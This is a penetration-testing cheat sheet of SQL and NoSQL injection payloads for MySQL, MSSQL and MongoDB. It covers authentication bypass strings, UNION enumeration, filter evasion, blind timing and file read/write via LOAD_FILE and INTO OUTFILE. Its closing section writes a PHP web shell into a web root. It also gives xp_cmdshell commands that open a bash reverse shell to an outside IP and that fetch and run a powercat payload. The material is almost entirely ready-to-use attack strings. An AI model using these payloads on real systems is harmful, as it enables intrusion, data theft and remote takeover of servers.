# Injection Shortlist

### Common Injection Queries

{% tabs %}
{% tab title="MySQL" %}
 ‘ or 1=1\#  
 ‘ or 1=1– –  
 ‘ or 1=1/\* \(MySQL &lt; 5.1\)  
 ' or 1=1;%00  
 ' or 1=1 union select 1,2 as \`  
 ' or\#newline  
 1='1  
 ' or– -newline  
 1='1  
 ' /\*!50000or\*/1='1  
 ' /\*!or\*/1='1  
**Prefixes**  
 + – ~ !  
 ‘ or –+2=- -!!!’2  
**Operators**  
 ^, =, !=, %, /, \*, &, &&, \|, \|\|, , &gt;&gt;, &lt;=, &lt;=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL  
**Whitespaces**  
 %20 %09 %0a %0b %0c %0d %a0 /\*\*/  
 ‘or+\(1\)sounds/\*\*/like“1“–%a0-  
 ‘union\(select\(1\),tabe\_name,\(3\)from\`information\_schema\`.\`tables\`\)\#  
**Strings with quotes**  
 SELECT ‘a’  
 SELECT “a”  
 SELECT n’a’  
 SELECT b’1100001′  
 SELECT \_binary’1100001′  
 SELECT x’61’  
**Strings without quotes**  
 ‘abc’ = 0x616263  
**Aliases**  
 select pass as alias from users  
 select pass aliasalias from users  
 select pass\`alias alias\`from users  
**Typecasting**  
 ‘ or true = ‘1 \# or 1=1  
 ‘ or round\(pi\(\),1\)+true+true = version\(\) \# or 3.1+1+1 = 5.1  
 ‘ or ‘1 \# or true  
**Compare operator typecasting**  
 select \* from users where ‘a’=’b’=’c’  
 select \* from users where \(‘a’=’b’\)=’c’  
 select \* from users where \(false\)=’c’  
 select \* from users where \(0\)=’c’  
 select \* from users where \(0\)=0  
 select \* from users where true  
 select \* from users

**Authentication bypass ‘=’**  
 select \* from users where name = ”=”  
 select \* from users where false = ”  
 select \* from users where 0 = 0  
 select \* from users where true  
 select \* from users

**Authentication bypass ‘-‘**  
 select \* from users where name = ”-”  
 select \* from users where name = 0-0  
 select \* from users where 0 = 0  
 select \* from users where true  
 select \* from users

**Enumerate number of columns/fields**  
...UNION SELECT 1;--  
...UNION SELECT 1,2;--  
...UNION SELECT 1,2,3;--

**Load file by injecting into the vulnerable field - encode string if necessary**  
…UNION ALL SELECT NULL,LOAD\_FILE\(‘&lt;user-readable-file&gt;’\),NULL,NULL;-- …UNION ALL SELECT NULL,LOAD\_FILE\(‘&lt;user-readable-file&gt;’\),NULL,NULL INTO OUTFILE ‘&lt;writeable-path-or-web-directorygt;’;--

**Dump/Write to file**  
_**\(see encode text/shell to hex, base64\)**_  
...SELECT \* FROM mytable INTO DUMPFILE ‘&lt;writeable-path-or-web-directorygt;’; —  
...SELECT \* FROM mytable INTO OUTFILE ‘&lt;writeable-path-or-web-directorygt;’; —

**General function filtering**  
 ascii \(97\)  
 load\_file/\*foo\*/\(0x616263\)  
**Strings with functions**  
 ‘abc’ = unhex\(616263\)  
 ‘abc’ = char\(97,98,99\)  
 hex\(‘a’\) = 61  
 ascii\(‘a’\) = 97  
 ord\(‘a’\) = 97  
 ‘ABC’ = concat\(conv\(10,10,36\),conv\(11,10,36\),conv\(12,10,36\)\)  
**Strings extracted from gadgets**  
 collation\(\N\) // binary  
 collation\(user\(\)\) // utf8\_general\_ci  
 @@time\_format // %H:%i:%s  
 @@binlog\_format // MIXED  
 @@version\_comment // MySQL Community Server \(GPL\)  
 dayname\(from\_days\(401\)\) // Monday  
 dayname\(from\_days\(403\)\) // Wednesday  
 monthname\(from\_days\(690\)\) // November  
 monthname\(from\_unixtime\(1\)\) // January  
 collation\(convert\(\(1\)using/\*\*/koi8r\)\) // koi8r\_general\_ci  
 \(select\(collation\_name\)from\(information\_schema.collations\)where\(id\)=2\) // latin2\_czech\_cs  
**Special characters extracted from gadgets**  
 aes\_encrypt\(1,12\) // 4çh±{?”^c×HéÉEa  
 des\_encrypt\(1,2\) // ‚GÒ/ïÖk  
 @@ft\_boolean\_syntax // + -&gt;&lt;\(\)~\*:""&\|  
 @@date\_format // %Y-%m-%d  
 @@innodb\_log\_group\_home\_dir // .\  
**Integer representations**  
 false: 0  
 true: 1  
 true+true: 2  
 floor\(pi\(\)\): 3  
 ceil\(pi\(\)\): 4  
 floor\(version\(\)\): 5  
 ceil\(version\(\)\): 6  
 ceil\(pi\(\)+pi\(\)\): 7  
 floor\(version\(\)+pi\(\)\): 8  
 floor\(pi\(\)\*pi\(\)\): 9  
 ceil\(pi\(\)\*pi\(\)\): 10  
 concat\(true,true\): 11  
 ceil\(pi\(\)\*pi\(\)\)+true: 11  
 ceil\(pi\(\)+pi\(\)+version\(\)\): 12  
 floor\(pi\(\)\*pi\(\)+pi\(\)\): 13  
 ceil\(pi\(\)\*pi\(\)+pi\(\)\): 14  
 ceil\(pi\(\)\*pi\(\)+version\(\)\): 15  
 floor\(pi\(\)\*version\(\)\): 16  
 ceil\(pi\(\)\*version\(\)\): 17  
 ceil\(pi\(\)\*version\(\)\)+true: 18  
 floor\(\(pi\(\)+pi\(\)\)\*pi\(\)\): 19  
 ceil\(\(pi\(\)+pi\(\)\)\*pi\(\)\): 20  
 ceil\(ceil\(pi\(\)\)\*version\(\)\): 21  
 concat\(true+true,true\): 21  
 ceil\(pi\(\)\*ceil\(pi\(\)+pi\(\)\)\): 22  
 ceil\(\(pi\(\)+ceil\(pi\(\)\)\)\*pi\(\)\): 23  
 ceil\(pi\(\)\)\*ceil\(version\(\)\): 24  
 floor\(pi\(\)\*\(version\(\)+pi\(\)\)\): 25  
 floor\(version\(\)\*version\(\)\): 26  
 ceil\(version\(\)\*version\(\)\): 27  
 ceil\(pi\(\)\*pi\(\)\*pi\(\)-pi\(\)\): 28  
 floor\(pi\(\)\*pi\(\)\*floor\(pi\(\)\)\): 29  
 ceil\(pi\(\)\*pi\(\)\*floor\(pi\(\)\)\): 30  
 concat\(floor\(pi\(\)\),false\): 30  
 floor\(pi\(\)\*pi\(\)\*pi\(\)\): 31  
 ceil\(pi\(\)\*pi\(\)\*pi\(\)\): 32  
 ceil\(pi\(\)\*pi\(\)\*pi\(\)\)+true: 33  
 ceil\(pow\(pi\(\),pi\(\)\)-pi\(\)\): 34  
 ceil\(pi\(\)\*pi\(\)\*pi\(\)+pi\(\)\): 35  
 floor\(pow\(pi\(\),pi\(\)\)\): 36  
@@new: 0  
 @@log\_bin: 1  
!pi\(\): 0  
 !!pi\(\): 1  
 true-~true: 3  
 log\(-cos\(pi\(\)\)\): 0  
 -cos\(pi\(\)\): 1  
 coercibility\(user\(\)\): 3  
 coercibility\(now\(\)\): 4  
minute\(now\(\)\)  
 hour\(now\(\)\)  
 day\(now\(\)\)  
 week\(now\(\)\)  
 month\(now\(\)\)  
 year\(now\(\)\)  
 quarter\(now\(\)\)  
 year\(@@timestamp\)  
 crc32\(true\)  
**Extract substrings**  
 substr\(‘abc’,1,1\) = ‘a’  
 substr\(‘abc’ from 1 for 1\) = ‘a’  
 substring\(‘abc’,1,1\) = ‘a’  
 substring\(‘abc’ from 1 for 1\) = ‘a’  
 mid\(‘abc’,1,1\) = ‘a’  
 mid\(‘abc’ from 1 for 1\) = ‘a’  
 lpad\(‘abc’,1,space\(1\)\) = ‘a’  
 rpad\(‘abc’,1,space\(1\)\) = ‘a’  
 left\(‘abc’,1\) = ‘a’  
 reverse\(right\(reverse\(‘abc’\),1\)\) = ‘a’  
 insert\(insert\(‘abc’,1,0,space\(0\)\),2,222,space\(0\)\) = ‘a’  
 space\(0\) = trim\(version\(\)from\(version\(\)\)\)  
Search substrings  
 locate\(‘a’,’abc’\)  
 position\(‘a’,’abc’\)  
 position\(‘a’ IN ‘abc’\)  
 instr\(‘abc’,’a’\)  
 substring\_index\(‘ab’,’b’,1\)  
**Cut substrings**  
 length\(trim\(leading ‘a’ FROM ‘abc’\)\)  
 length\(replace\(‘abc’, ‘a’, ”\)\)  
**Compare strings**  
 strcmp\(‘a’,’a’\)  
 mod\(‘a’,’a’\)  
 find\_in\_set\(‘a’,’a’\)  
 field\(‘a’,’a’\)  
 count\(concat\(‘a’,’a’\)\)  
**String length**  
 length\(\)  
 bit\_length\(\)  
 char\_length\(\)  
 octet\_length\(\)  
 bit\_count\(\)  
**String case**  
 ucase  
 lcase  
 lower  
 upper  
 password\(‘a’\) != password\(‘A’\)  
 old\_password\(‘a’\) != old\_password\(‘A’\)  
 md5\(‘a’\) != md5\(‘A’\)  
 sha\(‘a’\) != sha\(‘A’\)  
 aes\_encrypt\(‘a’\) != aes\_encrypt\(‘A’\)  
 des\_encrypt\(‘a’\) != des\_encrypt\(‘A’\)  
  
**Connected keyword filtering**  
 \(0\)union\(select\(table\_name\),column\_name,…  
 0/\*\*/union/\*!50000select\*/table\_name\`foo\`/\*\*/…  
 0%a0union%a0select%09group\_concat\(table\_name\)….  
 0’union all select all\`table\_name\`foo from\`information\_schema\`. \`tables\`  
OR, AND  
 ‘\|\|1=’1  
 ‘&&1=’1  
 ‘=’  
 ‘-‘  
OR, AND, UNION  
 ‘ and \(select pass from users limit 1\)=’secret  
OR, AND, UNION, LIMIT  
 ‘ and \(select pass from users where id =1\)=’a  
OR, AND, UNION, LIMIT, WHERE  
 ‘ and \(select pass from users group by id having id = 1\)=’a  
OR, AND, UNION, LIMIT, WHERE, GROUP  
 ‘ and length\(\(select pass from users having substr\(pass,1,1\)=’a’\)\)  
OR, AND, UNION, LIMIT, WHERE, GROUP, HAVING  
 ‘ and \(select substr\(group\_concat\(pass\),1,1\) from users\)=’a  
 ‘ and substr\(\(select max\(pass\) from users\),1,1\)=’a  
 ‘ and substr\(\(select max\(replace\(pass,’lastpw’,”\)\) from users\),1,1\)=’a  
OR, AND, UNION, LIMIT, WHERE, GROUP, HAVING, SELECT  
 ‘ and substr\(load\_file\(‘file’\),locate\(‘DocumentRoot’,\(load\_file\(‘file’\)\)\)+length\(‘DocumentRoot’\),10\)=’a  
 ‘=” into outfile ‘/var/www/dump.txt  
OR, AND, UNION, LIMIT, WHERE, GROUP, HAVING, SELECT, FILE  
 ‘ procedure analyse\(\)\#  
 ‘-if\(name=’Admin’,1,0\)\#  
 ‘-if\(if\(name=’Admin’,1,0\),if\(substr\(pass,1,1\)=’a’,1,0\),0\)\#  
Control flow  
 case ‘a’ when ‘a’ then 1 \[else 0\] end  
 case when ‘a’=’a’ then 1 \[else 0\] end  
 if\(‘a’=’a’,1,0\)  
 ifnull\(nullif\(‘a’,’a’\),1\)
{% endtab %}

{% tab title="MSSQL" %}
admin' --  
admin' \#  
admin'/\*  
' or 1=1--  
' or 1=1\#  
' or 1=1/\*  
'\) or '1'='1--  
'\) or \('1'='1--  
  
**Blind SQL:**  
' waitfor delay '00:00:10'--
{% endtab %}

{% tab title="NoSQL" %}
true, $where: '1 == 1'  
, $where: '1 == 1'  
$where: '1 == 1'  
', $where: '1 == 1'  
1, $where: '1 == 1'  
{ $ne: 1 }  
', $or: \[ {}, { 'a':'a  
' } \], $comment:'successful MongoDB injection'  
db.injection.insert\({success:1}\);  
db.injection.insert\({success:1}\);return 1;db.stores.mapReduce\(function\(\) { { emit\(1,1  
\|\| 1==1  
' && this.password.match\(/.\*/\)//+%00  
' && this.passwordzz.match\(/.\*/\)//+%00  
'%20%26%26%20this.password.match\(/.\*/\)//+%00  
'%20%26%26%20this.passwordzz.match\(/.\*/\)//+%00  
{$gt: ''}  
\[$ne\]=1  
db.getName\(\) –Get current DB name  
db.members.count\(\) –Get number of documents in the collection  
db.members.validate\({ full : true}\) –Get ALL information about this collection  
db.members.stats\(\) –Get information about this collection  
db.members.remove\(\) –remove all documents from current collection  
db.members.find\(\).skip\(0\).limit\(1\) –Get documents from DB \(Change only number in skip\(\) function\)  
db.getMongo\(\).getDBNames\(\).toString\(\) –Get the list of all DBs  
db.members.find\(\)\[0\]\[‘pass’\] –Get “pass” value from current collection
{% endtab %}
{% endtabs %}

### **Load file by injecting into the vulnerable field**

```text
…UNION ALL SELECT NULL,LOAD_FILE(‘<user-readable-file>’),NULL,NULL;-- …UNION ALL SELECT NULL,LOAD_FILE(‘<user-readable-file>’),NULL,NULL INTO OUTFILE ‘<writeable-path-or-web-directorygt;’;--
```

### **Dump/Write to file**

```text
...SELECT * FROM mytable INTO DUMPFILE ‘<writeable-path-or-web-directorygt;’; —
```

```text
...SELECT * FROM mytable INTO OUTFILE ‘<writeable-path-or-web-directorygt;’; —
```

### **Shell Through Injection**

```text
SELECT '<?php exec($_GET[''cmd'']); ?>' FROM mytable INTO dumpfile ‘/var/www/html/shell.php’
```

```text
EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

```text
EXEC xp_cmdshell 'powershell -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString("http://10.1.1.1:8080/powercat.ps1");powercat -c 10.1.1.1 -p 443 -e cmd' 
```

